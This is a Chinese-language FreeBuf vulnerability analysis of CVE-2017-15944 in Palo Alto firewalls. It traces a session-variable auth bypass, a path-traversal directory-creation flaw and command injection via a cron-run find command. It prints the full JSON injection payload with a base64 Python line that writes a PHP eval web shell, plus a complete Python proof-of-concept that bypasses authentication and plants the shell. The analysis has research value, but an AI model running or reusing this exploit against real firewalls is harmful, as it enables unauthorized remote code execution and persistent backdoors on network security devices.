***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ***本文原创作者：xmwanth，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

 **这篇文章是对Palo Alto防火墙产品未授权远程代码执行漏洞（CVE-2017-15944
）中SESSION设置、任意目录创建、命令执行漏洞的技术分析。之前对该漏洞认证绕过部分进行了[介绍](http://www.freebuf.com/articles/es/159119.html)，这篇文章是该漏洞的后续部分。**

## （一）SESSION设置

在认证绕过漏洞中，需要通过访问<https://ip/esp/cms_changeDeviceContext.esp>来设置SESSION中的user变量。在cms_changeDeviceContext.esp中，调用了panUserSetDeviceLocation($_SESSION['user'],
$_GET['device'], 0, new
php_string_argout())，这个函数的实现在/usr/lib/php/modules/panmodule.so中。下面通过调试该函数，来分析SESSION变量的设置。访问<https://ip/esp/cms_changeDeviceContext.esp?device=4096:aaaaaaaa:bbbbbbbb>，进入panUserSetDeviceLocation函数：

![新建位图图像
\(2\).bmp](https://image.3001.net/images/20180304/15201736533523.bmp!small)  

1、deviceStr指针指向的字符串就是传入的URL参数device的值：”4096:aaaaaaaa:bbbbbbbb”

2、调用panPhpConvertStringToLoc(char* deviceStr, pan_swal_config_loc_t*
pLoc)函数，将deviceStr进行处理后存储在pLoc中，处理的主要逻辑如下：

![新建位图图像
\(2\).bmp](https://image.3001.net/images/20180304/15201737553632.bmp!small)  

1） 寻找第一个':'字符，将第一个':'之前的字符串按照十进制转化为整数dNumber；

2）寻找第二个':'字符，将第一个':'与第二个':'之间的字符串deviceName(多余20h个，自动截断)复制在4-24h字节处；

3）寻找第三个':'字符，将第二个':'与第三个':'之间的字符串str2(多余20h个，自动截断)复制在24h-44h字节处；

4）如果有，继续寻找后面':'字符，将第n个':'与第n+1个':'之间的字符串strn(多余20h个，自动截断)复制在24h-44h字节处，覆盖原来的数据最后pLoc的结构如下：

![无标题.png](https://image.3001.net/images/20180304/15201740611295.png!small)  

3、调用panPhpSetDeviceForSession(pan_char_t *cookie, pan_char_t *devName,
pan_char_t *errMsgBuf, pan_uint32_t
bufSize)函数，参数devName字符串就是pLoc结构中的devName字符串，在该输入中，为"aaaaaaaa"。panPhpSetDeviceForSession调用panPhpSetDeviceAndVsysForSession(pan_char_t
*cookie, pan_char_t *devName, pan_char_t *vsysName, pan_char_t *errMsgBuf,
pan_uint32_t
bufSize)，参数devName字符串就是pLoc结构中的devName字符串，在该输入中为"aaaaaaaa"；参数vsysName字符串为“vsys1”。

panPhpSetDeviceAndVsysForSession的关键处理逻辑如下：

1）调用panPhpConvertLocToString，返回“8:aaaaaaaa”

2）通过panPhpSetSessionVar函数，将session变量dloc设置为“8:aaaaaaaa”

3）通过panPhpSetSessionVar函数，将session变量loc设置为“16:aaaaaaaa:vsys1”

![无标题.png](https://image.3001.net/images/20180304/15201742905379.png!small)

4、根据上述分析，如果像上篇文章(<http://www.freebuf.com/articles/es/159119.html>)一样，输入<https://ip/esp/cms_changeDeviceContext.esp>
?device=aaaa:bbbb'";user|s: ，则dloc的数值为
8:bbbb'";user|s，loc的数值为16:bbbb'";user|s:vsys1，读取的session的数值为
dloc|s:15:8:bbbb'”;user|s”;loc|s:22:"16:bbbb'";user|s:vsys1″;

## （二）任意目录创建

向<https://ip/php/utils/router.php/Administrator.get>利用POST方式提交如下数据：

    
    
    {"action":"PanDirect","method":"execute","data":["07c5807d0d927dcd0980f86024e5208b","Administrator.get",{"changeMyPassword":true,"template":"asd","id":"admin']\"        async-mode='yes' refresh='yes' cookie='../../../../../../tmp/hacked'/>\u0000"}],"type":"rpc","tid":713}

会创建/tmp/hacked文件，下面对原理进行分析：

1、router.php文件中定义了ExtDirect_Router类，该类继承自RouterAbstract

2、router.php新建ExtDirect_Router对象，并依次调用getResponse()=>>dispatch()，在dispatch中对POST提交的数据进行JSON处理，收到的POST数据为：

    
    
    {"action":"PanDirect","method":"execute","data":["07c5807d0d927dcd0980f86024e5208b","Administrator.get",{"changeMyPassword":true,"template":"asd","id":"admin']\"        async-mode='yes' refresh='yes' cookie='../../../../../../tmp/hacked'/>\u0000"}],"type":"rpc","tid":713}

处理之后赋值给request变量，requet变量的数值如下：

![无标题.png](https://image.3001.net/images/20180304/15201747837794.png!small)  

3、将request变量提交给rpc($request)函数，在rpc函数中通过call_user_func_array(array($instance,$method),
$params)调用PanDirect->execute（$params）  

![无标题.png](https://image.3001.net/images/20180304/15201748609794.png!small)

4、PanDirect->execute（$params）的逻辑如下：

1）checkValidRemoteCall对类、方法、是否为静态方法进行判定；

2）$obj = $reflection->newInstanceArgs(array($jsonArgs));建立Administrator类；

3）$obj->$method();调用Administrator类的get方法

![无标题.png](https://image.3001.net/images/20180304/15201749488843.png!small)

5、Administrator.get方法调用Direct::getConfigByXpath()函数，形成的xml如下图：

![无标题.png](https://image.3001.net/images/20180304/1520175016681.png!small)  

6、最终通过MSCommection.php中的writeaPayload函数将xml字符串发送给后台进程mgmtsrvr

7、mgmtsrvr中的pan_mgmtsrvr_client_svc函数接收的数据如下。/tmp/hacked'/>之后，有个0字节，形成数据截断

![无标题.png](https://image.3001.net/images/20180304/1520175103774.png!small)

8、最终在libpanmp_mp.so.1中的pan_jobmgr_store_job_result函数中利用路径回溯，建立了/tmp/hacked文件夹

![无标题.png](https://image.3001.net/images/20180304/15201751491093.png!small)

## （三）命令执行

1、查看/etc/cron.d/目录下的文件，此目录下存放的是系统级任务的任务文件。下面有个indexgen文件，会在0、15、30、45分钟的时候执行genindex_batch.sh脚本：

    
    
    SHELL=/bin/bash
    
    0,15,30,45 * * * * root /usr/local/bin/genindex_batch.sh

在genindex_batch.sh中调用了/usr/local/bin/genindex.sh脚本

2、genindex.sh中造成命令执行的关键代码如下，其中PAN_BASE_DIR=/opt/pancfg/mgmt  

![无标题.png](https://image.3001.net/images/20180304/15201752386905.png!small)  

3、命令执行

1)利用文件夹创建漏洞，发送

    
    
    {"action":"PanDirect","method":"execute","data":["07c5807d0d927dcd0980f86024e5208b","Administrator.get",{"changeMyPassword":true,"template":"asd","id":"admin']\" async-mode='yes' refresh='yes' cookie='../../../../../../opt/pancfg/mgmt/logdb/traffic/1/* -print -exec python -c exec(\"Zj1vcGVuKCcvdmFyL2FwcHdlYi9odGRvY3MvdnVkcmMucGhwJywgJ3cnKTtmLndyaXRlKCI8P3BocCBAZXZhbCgkX1BPU1RbJ2NodnVjMDEwJ10pOz8+Iik7Zi5jbG9zZSgpOw==\".decode(\"base64\")) ;'/>\u0000"}],"type":"rpc","tid":713}

2)创建文件夹/opt/pancfg/mgmt/logdb/traffic/1/* -print -exec python -c
exec("Zj1vcGVuKCcvdmFyL2FwcHdlYi9odGRvY3MvdnVkcmMucGhwJywgJ3cnKTtmLndyaXRlKCI8P3BocCBAZXZhbCgkX1BPU1RbJ2NodnVjMDEwJ10pOz8+Iik7Zi5jbG9zZSgpOw==".decode("base64"))
;，其中base64编码数据解码之后的数值为f=open('/var/appweb/htdocs/vudrc.php',
'w');f.write("<?php @eval($_POST['chvuc010']);?>");f.close();

3)genindex.sh执行的时候，执行的`find $day -mmin +5 -name pan.*.log | sort -r` 成为`find
/opt/pancfg/mgmt/logdb/traffic/1/* -print -exec python -c
exec("Zj1vcGVuKCcvdmFyL2FwcHdlYi9odGRvY3MvdnVkcmMucGhwJywgJ3cnKTtmLndyaXRlKCI8P3BocCBAZXZhbCgkX1BPU1RbJ2NodnVjMDEwJ10pOz8+Iik7Zi5jbG9zZSgpOw==".decode("base64"))
; -mmin +5 -name pan.*.log | sort -r`，形成命令注入。

4)最多15分钟后，在/var/appweb/htdocs/vudrc.php写入一句话木马，密码为chvuc010

## （四）poc  

    
    
    import urllib  
    import urllib2  
    import ssl    
    import sys  
      
    ssl._create_default_https_context = ssl._create_unverified_context   
      
    domain = "192.168.1.1"  
      
    #pass auth  
    print "step 1: pass_auth"  
    pass_auth_url = "https://" + domain + "/esp/cms_changeDeviceContext.esp?device=1024:bbbb'\";user|s:"  
    print "pass_auth request:    " + pass_auth_url  
    request = urllib2.Request(pass_auth_url)  
    response = urllib2.urlopen(request)  
    print "pass_auth respone:    " + response.read()  
    session_start_index = response.headers['Set-Cookie'].find("PHPSESSID")  
    if session_start_index == -1:  
        print "pass_auth fail!!"  
        sys.exit()  
    session = response.headers['Set-Cookie'][session_start_index:]  
    session = session[:session.find(';')]  
    auth_headers = {  
     'Cookie':session,  
     'Connection':'keep-alive'  
    }  
      
      
    print "\n"  
    print "step 2: check if pass auth"  
    auth_url = "https://" + domain + "/php/utils/debug.php"  
    print "auth_url request:    " + auth_url  
    request = urllib2.Request(auth_url, headers = auth_headers)  
    response = urllib2.urlopen(request)  
    content = response.read()  
    #print content  
    if "Debug" not in content:  
        print "pass auth fail!!"  
        sys.exit()  
    print "pass auth success!!"  
      
      
    print "\n"  
    print "setp 3: create dir"  
    create_dir_url = "https://" + domain + "/php/utils/router.php/Administrator.get"  
    print "create_dir request:    " + create_dir_url  
    post_data = "{\"action\":\"PanDirect\",\"method\":\"execute\",\"data\":[\"07c5807d0d927dcd0980f86024e5208b\",\"Administrator.get\",{\"changeMyPassword\":true,\"template\":\"asd\",\"id\":\"admin']\\\" async-mode='yes' refresh='yes' cookie='../../../../../../opt/pancfg/mgmt/logdb/traffic/1/* -print -exec python -c exec(\\\"Zj1vcGVuKCcvdmFyL2FwcHdlYi9odGRvY3MvdnVkcmMucGhwJywgJ3cnKTtmLndyaXRlKCI8P3BocCBAZXZhbCgkX1BPU1RbJ2NodnVjMDEwJ10pOz8+Iik7Zi5jbG9zZSgpOw==\\\".decode(\\\"base64\\\")) ;'/>\\u0000\"}],\"type\":\"rpc\",\"tid\":713}"  
    request = urllib2.Request(create_dir_url, headers = auth_headers, data=post_data)  
    response = urllib2.urlopen(request)  
      
    print "\n"  
    print "15 minutes later, visit https://" + domain + "/vudrc.php"  
    

 ***本文原创作者：xmwanth，本文属FreeBuf原创奖励计划，未经许可禁止转载**

